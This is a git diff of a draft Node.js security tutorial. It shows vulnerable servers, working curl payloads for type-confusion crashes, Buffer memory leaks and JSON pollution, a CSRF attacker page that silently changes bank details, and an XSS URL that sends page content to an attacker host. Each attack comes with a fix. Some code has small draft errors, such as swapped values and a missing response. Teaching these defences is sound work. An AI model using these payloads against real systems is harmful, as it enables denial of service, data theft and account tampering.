@@ -149,8 +149,9 @@ Running the above commands should look result in something like the following:
 
 #### Restricting Core Module Usage 
 
-Some core modules are very powerful, and we depend on third party
-which may perform powerful operations with little transparency. 
+Some core modules are very powerful, and we often depend on 
+third party modules which may perform powerful operations 
+with little transparency. 
 
 This could lead to unintended vulnerabilities where user input is 
 passed through a dependency tree that eventually leads to shell 
@@ -469,7 +470,7 @@ a site over HTTPS using the `Strict-Transport-Security`
 that browser becomes locked-in to using HTTPS, every 
 subsequent visit must use HTTPS.
 
-> #### Other `helmet` extras
+> #### Other `helmet` extras ![](../info.png)
 > The `helmet` library can also enable a few other headers.
 > In some cases, we may wish to disable client caching. 
 > The `helmet.noCache` middleware will set a variety of headers 
@@ -727,7 +728,7 @@ Connection: keep-alive
 * TBD
 
 
-## Managing Malicious Unexpected Input
+## Anticipating Malicious Input
 
 Malicious input can often catch us by surprise. We tend to
 cater to the common cases of but can easily neglect more 
@@ -819,7 +820,7 @@ $ curl -g http://localhost:3000/?msg[]=hello
 curl: (52) Empty reply from server
 ```
 
-> #### `curl -g` ![](.../info.png)
+> #### `curl -g` ![](../info.png)
 > The `-g` flag when passed to curl turns of a globbing option,
 > which allows us to use the square brackets in a URL
 
@@ -865,7 +866,7 @@ that is, every string has the `toUpperCase` method.
 If `req.query.msg.toUpperCase is not a function` then 
 `req.query.msg` isn't a string. 
 
-> #### What about POST requests 
+> #### What about POST requests ![](../info.png)
 > If the request was a POST request, our server would have the same
 > problem because the body of a application/x-www-form-urlencoded
 > POST request (the default for HTML forms) is also a query string.
@@ -912,20 +913,479 @@ HELLO
 
 ### How it works
 
+In this case the adversarial input takes advantage of a 
+fairly common mistake - to assume that query string (or request body)
+parameters will always be strings. 
+
+While there is no specification on how to handle multiple
+parameters of the same name nor the array-like annotation
+(`msg[]=eg`) Web frameworks on most platforms tend to support
+these cases. Even Node's query `querystring` module will convert
+multiple parameters of the same name to arrays. 
+
+The `qs` module (which is used by both Express and Hapi), 
+will convert namespace conflicts, or names with array-like annotation
+(that is, with the square bracket suffix) into arrays. 
+
+When we always assume a parameter will be a string, we may 
+attempt to call a method which applies exclusively to strings
+(such as `toUpperCase`) without checking the type.
+
+When the parameter is an array, our runtime will attempt to 
+invoke `undefined` as a function, and the server will crash, opening
+us up to an very easily executed Denial of Service attack. 
+
+Forgetting to check the parameter type can also lead to other 
+possibilities, such as Cross Site Scripting (XSS) attacks.
+For instance, XSS filtering could be bypassed in situations where
+parameters are concatenated - for instance by splitting up character
+series like `<script>` that would normally trigger XSS warnings.
 
 ### There's more
 
-#### Dealing with JSON pollution
+Let's look at some other ways malicious input might catch us off
+guard.
 
 #### Buffer safety
 
+The `Buffer` constructor is highly powerful but with potential 
+for danger.
+
+Let's simply create an `index.js` file with the following code:
+
+```js
+const http = require('http')
+
+const server = http.createServer((req, res) => {
+  if (req.method === 'GET') {
+    res.setHeader('Content-Type', 'text/html')
+    if (req.url === '/') return res.end(html())
+    res.setHeader('Content-Type', 'application/json')
+    if (req.url === '/friends') return res.end(friends())
+    
+    return
+  }
+  if (req.method === 'POST') {
+    if (req.url === '/') return action(req, res) 
+  }
+})
+
+function html (res) {
+  return `
+    <div id=friends></div>
+    <form>
+      <input id=friend> <input type=submit value="Add Friend">
+    </form>
+    <script>
+      void function () {
+        var friend = document.getElementById('friend')
+        var friends = document.getElementById('friends')
+        function load () {
+          fetch('/friends', {
+            headers: {
+              'Accept': 'application/json, text/plain, */*',
+              'Content-Type': 'application/json'
+            }
+          }).catch((err) => console.error(err))
+            .then((res) => res.json())
+            .then((arr) => friends.innerHTML = arr.map((f) => atob(f)).join('<br>'))
+        }
+        load()
+
+        document.forms[0].addEventListener('submit', function () {
+          fetch('/', {
+            method: 'post', 
+            headers: {
+              'Accept': 'application/json, text/plain, */*',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({cmd: 'add', friend: friend.value})
+          }).catch((err) => console.error(err))
+            .then(load)
+        })
+      }()
+    </script>
+  `
+}
+
+function friends () {
+  return JSON.stringify(friends.list)
+}
+friends.list = [Buffer('Dave').toString('base64')]
+friends.add = (friend) => friends.list.push(Buffer(friend).toString('base64'))
+
+function action (req, res) {
+  var data = ''
+  req.on('data', (chunk) => data += chunk)
+  req.on('end', () => {
+    try {
+      data = JSON.parse(data)
+    } catch (e) {
+      res.end('{"ok": false}')
+      return
+    }
+    if (data.cmd === 'add') {
+      friends.add(data.friend)
+    }
+    res.end('{"ok": true}')
+  })
+}
+
+server.listen(3000)
+```
+
+We can start our server with: 
+
+```sh
+$ node index.js
+```
+
+This is a server with three routes, `GET /`, `POST /` and `GET /friends`.
+The `GET /` route delivers some HTML with an inline client side script
+that hits the `/friends` route, recieves a JSON array payload, and
+maps over each item in the array to convert it from base64 with the 
+browsers `atob` function. The `POST /` route parses any incoming JSON
+payloads, checks for a `cmd` property with a value of `add` and 
+calls `friends.add(data.friend)`. The `friends.add` method converts
+the input into base64 and adds it to an array. On the client side, the
+`load` function is called again after a successful `POST` request,
+and the updated list of friends is loaded.
+
+However, if we use `curl` to make the following request:
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST -d '{"cmd": "add", "friend": 10240}' http://127.0.0.1:3000
+```
+
+And then check the browser, at http://localhost:3000,
+we'll see something similar to the following:
+
+![](images/buffer-safety.png)
+
+We set the `friend` field in the JSON payload to a number, which was
+passed directly to the `Buffer` constructor. The `Buffer` constructor
+is polymorphic, if it's passed a string the string will be converted
+to a buffer. However, if passed a number, it will allocate a buffer
+to the size of that number. For performance reasons, memory for the
+buffer is allocated from unlinked memory, which means potentially 
+anything could be exposed, including private keys.
+
+Let's copy `index.js` to `index-fixed.js`:
+
+```sh
+$ cp index.js index-fixed.js
+```
+
+Now we'll change the `friends` function and methods like so:
+
+```js
+function friends () {
+  return JSON.stringify(friends.list)
+}
+friends.list = [Buffer.from('Dave').toString('base64')]
+friends.add = (friend) => {
+  friends.list.push(Buffer.from(friend).toString('base64'))
+}
+```
+
+We're using `Buffer.from` instead of using `Buffer` directly.
+The `Buffer.from` method will throw when passed a number, it
+will only allow strings, arrays (and array-like objects), 
+and other buffers (including `Buffer` and `ArrayBuffer` objects).
+
+To make sure our server doesn't crash we can update the `action`
+function accordingly:
+
+```js
+function action (req, res) {
+  var data = ''
+  req.on('data', (chunk) => data += chunk)
+  req.on('end', () => {
+    try {
+      data = JSON.parse(data)
+    } catch (e) {
+      console.error(e)
+      res.end('{"ok": false}')
+      return
+    }
+    if (data.cmd === 'add') {
+      try {
+        friends.add(data.friend)
+      } catch (e) {
+        console.error(e)
+        res.end('{"ok": false}')
+      }
+    }
+  })
+}
+```
+
+If we start the fixed server:
+
+```sh
+$ node index-fixed.js
+```
+
+And run the same `curl` request: 
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST -d '{"cmd": "add", "friend": 10240}' http://127.0.0.1:3000
+```
+
+We'll see a response `{"ok": false}`, our server won't crash but
+will log the error: "TypeError: "value" argument must not be a number".
+Subsequent requests to `GET /` will show that no internal memory has been 
+exposed.
+
+
+#### Dealing with JSON pollution
+
+Let create a folder called `json-validation`, initialize it as a package
+and create an `index.js` file:
+
+```sh
+$ mkdir json-validation
+$ cd json-validation
+$ npm init -y
+$ touch index.js
+```
+
+The `index.js` should look like so:
+
+```js
+const http = require('http')
+const {STATUS_CODES} = http
+
+const server = http.createServer((req, res) => {
+
+  if (req.method !== 'POST') {
+    res.statusCode = 404
+    res.end(STATUS_CODES[res.statusCode])
+    return
+  }
+  if (req.url === '/register') {
+    register(req, res)
+    return
+  }
+  res.statusCode = 404
+  res.end(STATUS_CODES[res.statusCode])
+})
+
+function register (req, res) {
+  var data = ''
+  req.on('data', (chunk) => data += chunk)
+  req.on('end', () => {
+    try {
+      data = JSON.parse(data)
+    } catch (e) {
+      res.end('{"ok": false}')
+      return
+    }
+    // privileges can be multiple types, boolean, array, object, string,
+    // but the presence of the key means the user is an admin
+    if (data.hasOwnProperty('privileges')) {
+      createAdminUser(data)
+      res.end('{"ok": true, "admin": true}')
+    } else {
+      createUser(data)
+      res.end('{"ok": true, "admin": false}')
+    }
+  })
+}
+
+function createAdminUser (user) {
+  const key = user.id + user.name
+  // ... 
+}
+
+function createUser (user) {
+  // ... 
+}
+
+server.listen(3000)
+```
+
+Our server has a `/register` endpoint, which accepts
+POST requests to (hypothetically) add users to a system.
+
+There's two ways we can cause the server to crash.
+
+Let's try the following curl request: 
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST 
+-d '{"hasOwnProperty": 0}' http://127.0.0.1:3000/register
+```
+
+This will cause our server to crash with 
+"TypeError: data.hasOwnProperty is not a function". 
+
+If an object has a `privileges` property, the server infers
+that it's an admin user. Normal users don't have a privileges
+property. It uses the (often recommended in alternative scenarios) 
+`hasOwnProperty` method to check for the property. This is because
+the (pretend) system requirements property allow for the `privileges`
+property to be `false`, which is an admin user with minimum permissions.
+
+By sending a JSON payload with that key, we over-shadow the 
+Object.prototype.hasOwnProperty method, setting it to `0` 
+which is a number, not a function. 
+
+If we're checking for the existence of a value in an object which 
+we know to be parsed JSON we can check if the property is `undefined`.
+Since `undefined` isn't a valid JSON value, this means we know for sure 
+that the key doesn't exist.
+
+So we could update the if statement `if (data.hasOwnProperty('privileges'))`
+to `if (data.privileges !== undefined)`. However, this is more of a bandaid
+than a solution, what if our object is past to another function, perhaps
+one in a module which we didn't even write, and the `hasOwnProperty` method
+is used there? Secondly it's a specific work around, there are other 
+more subtle ways to pollute a JSON payload.
+
+Let's start our server again and run the following request: 
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST 
+-d '{"privileges": false, "id": {"toString":0}, "name": "foo"}' 
+http://127.0.0.1:3000/register
+```
+
+This will cause our server to crash with the error 
+"TypeError: Cannot convert object to primitive value".
+
+The `createAdminUser` function creates a `key` variable, 
+by concatenating the `id` field with the `name` field from
+the JSON payload. Since the `name` field is a string, 
+this causes `id` to be coerced (if necessary) to a string.
+Internally JavaScript achieves this by calling the `toString`
+method on the value (excepting `null` and `undefined`
+every primitive and object has the `toString` method on it's 
+prototype). Since we set the `id` field to an object, with a
+`toString` field set to `0` this overrides the prototypal 
+`toString` function replacing it with a the number `0`.
+
+This `toString` (and also `valueOf`) case is harder to protect 
+against. To be safe we need check the type of every value in the JSON, 
+to ensure that it's not an unexpected type. Rather than doing this
+manually we can use a schema validation library, 
+
+Generally, if JSON is being passed between back end services,
+we don't need to concern our selves too much with JSON pollution. 
+However, if a service is public facing, we are vulnerable. 
+
+In the main, it's a best practice to use schema validation for 
+any public facing servers that accept JSON, doing so avoids these
+sorts of issues (and potentially other issues when the data passes
+to other environments such as databases). 
+
+Let's install `ajv`, a performance schema validator
+and copy the `index.js` file to `index-fixed.js`
+
+```sh
+$ npm install --save ajv
+$ cp index.js index-fixed.js
+```
+
+We'll make the top of `index-fixed.js` should look like the following:
+
+```js
+
+const http = require('http')
+const ajv = new (require('ajv'))
+const schema = {
+  title: 'UserReg',
+  properties: {
+    id: {type: 'integer'},
+    name: {type: 'string'},
+    privileges: {
+      anyOf: [
+        {type: 'string'},
+        {type: 'boolean'},
+        {type: 'array', items: {type: 'string'}},
+        {type: 'object'}
+      ]
+    }
+  },
+  additionalProperties: false,
+  required: ['id', 'name']
+}
+const validate = ajv.compile(schema)
+const {STATUS_CODES} = http
+``` 
+
+> ##### JSONSchema ![](../info.png) 
+> The `ajv` module uses the JSONSchema format
+> for declare object schemas.
+> Find out more at <http://json-schema.org>
+
+The `register` function, we'll alter like so:
+
+```js
+function register (req, res) {
+  var data = ''
+  req.on('data', (chunk) => data += chunk)
+  req.on('end', () => {
+    try {
+      data = JSON.parse(data)
+    } catch (e) {
+      res.end('{"ok": false}')
+      return
+    }
+    const valid = validate(data, schema)
+    if (!valid) {
+      console.error(validate.errors)
+      res.end('{"ok": false}')
+      return
+    }
+      
+    if (data.hasOwnProperty('privileges')) {
+      createAdminUser(data)
+      res.end('{"ok": true, "admin": true}')
+    } else {
+      createUser(data)
+      res.end('{"ok": true, "admin": false}')
+    }
+  })
+}
+```
+
+Now if we re-run the `toString` attack:
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST -d '{"privileges": false, "id": {"toString": 0}, "name": "foo"}' http://127.0.0.1:3000/register
+```
+
+Our server stays alive, but logs a validation error:
+
+```
+[ { keyword: 'type',
+    dataPath: '[object Object].id',
+    schemaPath: '#/properties/id/type',
+    params: { type: 'integer' },
+    message: 'should be integer' } ]
+```
+
+Because we set `additionalProperties` to false on the schema, 
+the `hasOwnProperty` attack also fails (request made with additional required fields):
+
+```sh
+$ curl -H "Content-Type: application/json" -X POST -d '{"hasOwnProperty": 0, "id": 10, "name": "foo"}' http://127.0.0.1:3000/register
+```
+
+Our server stays alive, while an error message is logged:
+
+```
+[ { keyword: 'additionalProperties',
+    dataPath: '[object Object]',
+    schemaPath: '#/additionalProperties',
+    params: { additionalProperty: 'hasOwnProperty' },
+    message: 'should NOT have additional properties' } ]
+```
 
 ### See also
 
 * TBD
-
-
-
 
 ## Guarding Against Cross Site Scripting (XSS)
 
@@ -1330,7 +1790,7 @@ And attempt to use the same URL http://localhost:3000/?prev=javascript:(new%20Im
 when we click the "Back to Control HQ" link, we should instead receive 
 a 404 message (in development the message will be something like "Cannot GET /javascript:(new%20Image().src)=%60http://localhost:3001/attack/$%7Bbtoa(stat.innerHTML)%7D%60,0//en").
 
-> #### CSRF 
+> #### CSRF ![](../info.png)
 > This attack conceptually touches on CSRF, by using XSS to initiate  
 > an attack that uses the (hypothetical) access privilege 
 > of the user to execute commands on their behalf. We'll find out 
@@ -1443,24 +1903,400 @@ We can use jsesc to do this https://github.com/mathiasbynens/jsesc.
 ## Preventing Cross Site Request Forgery
 
 The browser security model, where a session cookie
-is valid among separate browser tabs/windows, enables
-a vast array of nefarious attacks on users. 
+is valid globally among all windows/tabs, allows 
+for a request to be made with the privileges of the logged 
+in user.
 
-note: SameSite
+Where Cross Site Scripting (XSS) is making code delivered through
+one place (be it a malicious site, email, text message, downloaded file, etcetera),
+execute on another site, Cross Site Request Forgery is the act of
+making a request from one place (again either a malicious site or otherwise)
+to another site that a user is logged into - that is where they 
+have an open HTTP Session.
 
+In short, XSS is running malicious code on another site, 
+CSRF is making a request to another site that executes an 
+action on a logged in users behalf. 
 
+In this recipe, we're going to secure a server against CSRF
+attacks.
 
 ### Getting Ready
 
+We're going to create a simple server that manages "Employee Payment Profile"
+updates, and an adversarial server that uses CSRF to change where 
+an employees hypothetical salary is sent.
+
+To demonstrate cross domain interaction locally, we need to simulate
+domains on our host machine, we can use the `devurl` tool,
+let's install it like so:
+
+```sh
+$ npm install -g devurl
+```
+
+Let's begin with the target server, we'll create a folder called `app`,
+initialize it as a package, install `express`, `express-session` and `body-parser`
+and `he`, and create an `index.js` file:
+
+```sh
+$ mkdir app
+$ cd app
+$ npm init -y
+$ npm install express express-session body-parser he
+$ touch index.js
+```
+
+Our `app/index.js` should look as follows:
+
+```
+const express = require('express')
+const bodyParser = require('body-parser')
+const session = require('express-session')
+const he = require('he')
+const app = express()
+
+const pretendData = {
+  dave: {
+    ac: '12345678',
+    sc: '88-26-26'
+  }
+}
+
+app.use(session({
+  secret: 'AI overlords are coming',
+  name: 'SESSIONID',
+  resave: false,
+  saveUninitialized: false  
+}))
+
+app.use(bodyParser.urlencoded({extended: false}))
+
+app.get('/', (req, res) => {
+  if (req.session.user) return res.redirect('/profile')
+  res.send(`
+    <h1> Login </h1>
+    <form method="POST" action="/">
+      <label> user <input name=user> </label> <br>
+      <label> pass <input name=pass type=password> </label> <br>
+      <input type=submit>
+    </form>
+  `)
+})
+
+app.post('/', (req, res) => {
+  if (req.body.user === 'dave' && req.body.pass === 'ncb') {
+    req.session.user = req.body.user
+  }
+  if (req.session.user) res.redirect('/profile')
+  else res.redirect('/')
+})
+
+app.get('/profile', (req, res) => {
+  if (!req.session.user) return res.redirect('/')
+  const {prev = '', handoverToken = '', lang = 'en'} = req.query
+  pretendDbQuery(req.session.user, (err, {sc, ac}) => {
+    if (err) {
+      res.sendStatus(500)
+      return
+    }
+    sc = he.encode(sc)
+    ac = he.encode(ac)
+    res.send(`
+      <h1>Employee Payment Profile</h1>
+      <form method="POST" action=/update>
+        <label> Sort Code <input name=sc value="${sc}"> </label> <br>
+        <label> Account # <input name=ac value="${ac}"> </label> <br>
+        <input type=submit>
+      </form>
+    `)
+  })
+})
+
+app.post('/update', (req, res) => {
+  if (!req.session.user) return res.sendStatus(403)
+  pretendData[req.session.user].ac = req.body.ac
+  pretendData[req.session.user].sc = req.body.sc
+  res.send(`
+    <h1> updated </h1>
+    <meta http-equiv="refresh" content="1; url=/profile">
+  `)
+})
+
+function pretendDbQuery (user, cb) {
+  cb(null, pretendData[user])
+}
+
+app.listen(3000)
+```
+
+> #### `he.encode` ![](../info.png)
+> See the **Guarding Against Cross Site Scripting (XSS)** recipe in this
+> chapter for details on why we use `he.encode` here.
+
+Now we'll create a hypothetical attackers server. 
+First we'll change directory up from the `app` folder, create an 
+`attacker` folder, with an `index.js` file:
+
+```sh
+$ cd ..
+$ mkdir attacker
+$ cd attacker
+$ touch index.js
+```
+
+The `attacker/index.js` should look as follows:
+
+```js
+const http = require('http')
+
+const attackerAc = '87654321'
+const attackerSc = '11-11-11'
+const attackerMsg = 'Everything you could ever want is only one click away'
+
+const server = http.createServer((req, res) => {
+  res.writeHead(200, {'Content-Type': 'text/html'})
+  res.end(`
+    <iframe name=hide style="position:absolute;left:-1000px"></iframe>
+    <form method="post" action="http://app.local/update" target=hide>
+      <input type=hidden name=sc value="${attackerAc}">
+      <input type=hidden name=ac value="${attackerSc}">
+      <input type=submit value="${attackerMsg}">
+    </form>
+  `)
+})
+
+server.listen(3001)
+```
+
 ### How to do it
+
+First lets explore the problem. We'll start both the vulnerable and
+adversarial servers. 
+
+If, on the command line, we are in the directory directly above the `app`
+and `attacker` we can start each server by referencing the folder:
+
+```sh
+$ node app/
+```
+
+And in another terminal window:
+
+```sh
+$ node attacker/
+```
+
+Now let's set up some local domains to proxy to our two servers,
+using `devurl` (which we installed in the **Getting Ready** section).
+
+In a third terminal window, we run:
+
+```sh
+$ devurl app.local http://localhost:3000
+```
+
+And in yet another terminal window:
+
+```sh
+$ devurl attacker.local http://localhost:3001
+
+
+Next let's navigate our browser to http://app.local,
+and login with the username of "dave" and password of "ncb",
+this should result in the following profile screen:
+
+![](images/csrf-1.png)
+
+The details show that the account number is 12345678
+and the sort code is 18-26-26.
+
+Now let's open a new tab, and navigate to http://attacker.local:
+
+![](images/csrf-2.png)
+
+While every instinct tells us not to click the button which says
+"Everything you could ever want is only one click away", let's
+click it. 
+
+Now if we go back to the first tab, and refresh, we'll find 
+that the details now show account number, 87654321
+with sort code 11-11-11. 
+
+This attack would work even if the first tab (where we initially
+logged in) was closed. As long as the browser still has a session
+cookie, any other tab or window can submit POST requests as a logged
+in user. 
+
+Now let's fix it. Let's copy the `app` folder to `fixed-app`.
+
+```sh
+$ cp -fr app fixed-app
+```
+
+In `fixed-app/index.js` we'll update the session middleware like so:
+
+```js
+app.use(session({
+  secret: 'AI overlords are coming',
+  name: 'SESSIONID',
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    sameSite: true
+  }
+}))
+```
+
+Now let's stop the `app` server and run the `fixed-app` server:
+
+```sh
+$ node fixed-app/
+```
+
+Also, we need to restart the `devurl` proxy:
+
+```sh
+$ devurl app.local http://localhost:3000
+```
+
+If we navigate the browser to http://app.local again,
+and login we'll see the profile screen as before.
+Opening a new tab at http://attacker.local and clicking the
+button should have no effect (which we can verify by 
+refreshing the http://app.local tab, as before). We should also 
+see a 403 Forbidden error in Chromes Devtools.
+
+> #### Browser Support ![](../info.png)
+> **WARNING**: The technique in this recipe is only supported
+> in modern browsers, see http://caniuse.com/#feat=same-site-cookie-attribute
+> for browser version support. In the **There's More** 
+> section we'll include a fallback technique that is essential to
+> avoiding CSRF attacks for browsers who lack support for the SameSite
+> cookie.  
 
 ### How it works
 
+The `express-session` `cookie.sameSite` option is passed to the
+the underlying `cookie` module which generates a `Set-Cookie`
+HTTP header with `SameSite=Strict` appended to the end. 
+
+For instance, header might look like:
+
+```
+Set-Cookie: SESSIONID=s%3Au1OmVSF6bQUXxMz4eIS4F8-32pK0rikc.f1y…bHX7QUGcH9ix5A; Path=/; HttpOnly; SameSite=Strict
+``` 
+
+Notice `SameSite=Strict` at the end. The `SameSite` directive can be 
+set to `strict` or `lax` - using `true` equates to setting it to `strict`.
+
+The `lax` mode allows `GET` requests (which should be immutable)
+to be submitted cross-site - this may be important in widget
+or advertising situations (such as a facebook like button). 
+
+If this isn't a requirement `strict` is a better option, since it precludes
+exploitation of poor or accidental route handling where a `GET` request
+modifies server state.
+
+When a (modern) browser observes the directive we essentially opt-in to
+an enforced same origin policy for cookies.   
+
 ### There's more
+
+Our app is not yet secure in old browsers, we need an alternative
+strategy. 
+
+#### Securing Older Browsers
+
+Not all browsers support the SameSite cookie directive, so in older
+browsers we need an alternative strategy. The best fallback strategy
+is to create cryptographically secure anti-csrf tokens which are 
+stored in a user session and mirrored back from the browser either in
+a request header, body or querystring. Since an attacker needs access
+to the session in order to steal the token, and access to the token in
+order to execute privileged actions this reduces the attack vector 
+significantly.
+
+Let's copy the `fixed-app` folder from the main recipe to
+a folder named `secured-app`, then install the `csurf` module
+in `secured-app`:
+
+```sh
+$ cp -fr fixed-app secured-app
+$ cd secured-app
+$ npm install --save csurf
+```
+
+We'll require `csurf` and instantiate an instance of it, the
+top of our `index.js` file should look like so:
+
+```js
+const express = require('express')
+const bodyParser = require('body-parser')
+const session = require('express-session')
+const he = require('he')
+const csurf = require('csurf')
+const app = express()
+const csrf = csurf()
+```
+
+Our `/profile` route should be altered like so:
+
+```js
+app.get('/profile', csrf, (req, res) => {
+  if (!req.session.user) return res.redirect('/')
+  const {prev = '', handoverToken = '', lang = 'en'} = req.query
+  pretendDbQuery(req.session.user, (err, {sc, ac}) => {
+    if (err) {
+      res.sendStatus(500)
+      return
+    }
+    sc = he.encode(sc)
+    ac = he.encode(ac)
+    res.send(`
+      <h1>Employee Payment Profile</h1>
+      <form method="POST" action=/update>
+        <input type=hidden name=_csrf value="${req.csrfToken()}">
+        <label> Sort Code <input name=sc value="${sc}"> </label> <br>
+        <label> Account # <input name=ac value="${ac}"> </label> <br>
+        <input type=submit>
+      </form>
+    `)
+  })
+})
+```
+
+We've inserted the `csrf` route protection middleware as the second
+argument, which gives the ability to call `req.csrfToken` in our
+HTML template. We generate the token with `req.csrfToken` and place
+it as the `value` input of a hidden field named `_csrf` (the
+`csurf` middleware looks in several places for the token, the 
+POST body `_csrf` namespace being one of them).
+
+Finally we include the `csrf` route protection middleware as
+the second argument of our `/update` post route as well:
+
+```js
+app.post('/update', csrf, (req, res) => {
+```
+
+The `csrf` middleware detects that the request is mutable (e.g. it's a POST
+method request) and checks the body of the POST request for a `_csrf`
+field which it checks against a token stored within the users session.
+
+Our server is now fully secured against CSRF attacks in modern and legacy
+browsers alike. 
+
+To be clear however, a server with an XSS vulnerability would still be
+susceptable to CSRF attacks, because an XSS exploit could be used to steal
+the CSRF token. The SameSite cookie directive does not have that problem.
 
 ### See also
 
 * TBD
+
+
+
 
 
 
